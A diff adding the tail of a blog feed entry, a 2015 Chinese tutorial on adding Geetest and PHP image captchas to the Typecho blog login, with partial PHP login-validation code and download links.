+        if (isset($_POST[&#39;geetest_challenge&#39;]) &amp;&amp; isset($_POST[&#39;geetest_validate&#39;]) &amp;&amp;    isset($_POST[&#39;geetest_seccode&#39;])) {
+            $validate_response = $geetestlib-&gt;geetest_validate(@$_POST[&#39;geetest_challenge&#39;], @$_POST[&#39;geetest_validate&#39;], @$_POST[&#39;geetest_seccode&#39;]);
+        }else{
+            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(&quot;use your own captcha validate &quot;);
+            $this-&gt;response-&gt;goBack();
+        }
+        if ($validate_response == TRUE) {
+        } else if ($validate_response == FALSE) {
+            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(&#39;请先验证&#39;);
+            $this-&gt;response-&gt;goBack();
+        }else{
+            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(&#39;FORBIDDEN&#39;);
+            $this-&gt;response-&gt;goBack();
+        }
+         /*  此处...省略...字 */
+ }
+</code></pre><p>…部分代码，详细下载链接如下：</p>
+<p><a href="/code/typecho-Login-1.php">http://homeway.me/code/typecho-Login-1.php</a></p>
+<p><hr><br></p>
+<h1 id="0x02-php生成图片"><a href="#0x02-php生成图片" class="headerlink" title="0x02.php生成图片"></a>0x02.php生成图片</h1><p>1、修改前端代码，修改<code>/admin/login.php</code>，添加如下：</p>
+<pre><code>    &lt;p&gt;
+           &lt;img style=&quot;cursor:pointer&quot; title=&quot;刷新验证码&quot; id=&quot;refresh&quot; border=&#39;0&#39; src=&#39;verify.php&#39; onclick=&quot;document.getElementById(&#39;refresh&#39;).src=&#39;typecho-code.php?t=&#39;+Math.random()&quot;/&gt;
+    &lt;/p&gt;
+    &lt;p&gt;
+        &lt;label for=&quot;name&quot; class=&quot;sr-only&quot;&gt;&lt;?php _e(&#39;验证码&#39;); ?&gt;&lt;/label&gt;
+           &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;verify&quot; value=&quot;&quot; placeholder=&quot;&lt;?php _e(&#39;验证码&#39;); ?&gt;&quot; class=&quot;text-l w-100&quot; /&gt;
+    &lt;/p&gt;
+</code></pre><p>2、添加php生成验证码的php插件，添加到<code>/admin/typecho-code.php</code>、<code>/admin/typecho-t1.ttf</code>，代码下载:</p>
+<p><a href="/code/typecho-code.php">http://homeway.me/code/typecho-code.php</a></p>
+<p><a href="/code/typecho-t1.ttf">http://homeway.me/code/typecho-t1.ttf</a></p>
+<p>3、修改后台验证代码，修改<code>/var/Widget/Login.php</code>如下：</p>
+<pre><code>session_start();
+$flag=true;
+class Widget_Login extends Widget_Abstract_Users implements Widget_Interface_Do {
+    public function action() {
+        /*  此处...省略...字 */
+        if (strtolower($_POST[&#39;verify&#39;]) != strtolower($_SESSION[&#39;verify&#39;]) ) {
+            /** 防止穷举,休眠3秒 */
+            sleep(3);
+            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(_t(&#39;验证码错误！&#39;), &#39;error&#39;);
+            $this-&gt;response-&gt;goBack(&#39;?referer=&#39; . urlencode($this-&gt;request-&gt;referer));
+            $flag = false;
+        }else{
+            /** 如果验证码对了，开始验证用户 **/
+            $valid = $this-&gt;user-&gt;login($this-&gt;request-&gt;name, $this-&gt;request-&gt;password,
+            false, 1 == $this-&gt;request-&gt;remember ? $this-&gt;options-&gt;gmtTime + $this-&gt;options-&gt;timezone+30*24*3600 : 0);
+            /** 比对密码 */
+            if (!$valid) {
+                /** 防止穷举,休眠3秒 */
+                sleep(3);
+                $this-&gt;pluginHandle()-&gt;loginFail($this-&gt;user, $this-&gt;request-&gt;name,
+                $this-&gt;request-&gt;password, 1 == $this-&gt;request-&gt;remember);
+                Typecho_Cookie::set(&#39;__typecho_remember_name&#39;, $this-&gt;request-&gt;name);
+                $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(_t(&#39;用户名或密码无效&#39;), &#39;error&#39;);
+                $this-&gt;response-&gt;goBack(&#39;?referer=&#39; . urlencode($this-&gt;request-&gt;referer));
+            }
+            $this-&gt;pluginHandle()-&gt;loginSucceed($this-&gt;user, $this-&gt;request-&gt;name,
+            $this-&gt;request-&gt;password, 1 == $this-&gt;request-&gt;remember);
+        }
+        /*  此处...省略...字 */
+    }
+}
+</code></pre><p>…部分代码，详细下载链接如下：</p>
+<p><a href="/code/typecho-Login-2.php">http://homeway.me/code/typecho-Login-2.php</a></p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-25-add-check-code-for-typecho"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-25-add-check-code-for-typecho" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/03/25/add-check-code-for-typecho/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/03/25/add-check-code-for-typecho/">http://homeway.me/2015/03/25/add-check-code-for-typecho/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-03-25 14:49:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://xiaocao.u.qiniudn.com/blog/logo-typecho.png&quot; alt=&quot;Typecho&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Typecho" scheme="https://homeway.me/tags/Typecho/"/>
+    
+  </entry>
+  
+</feed>
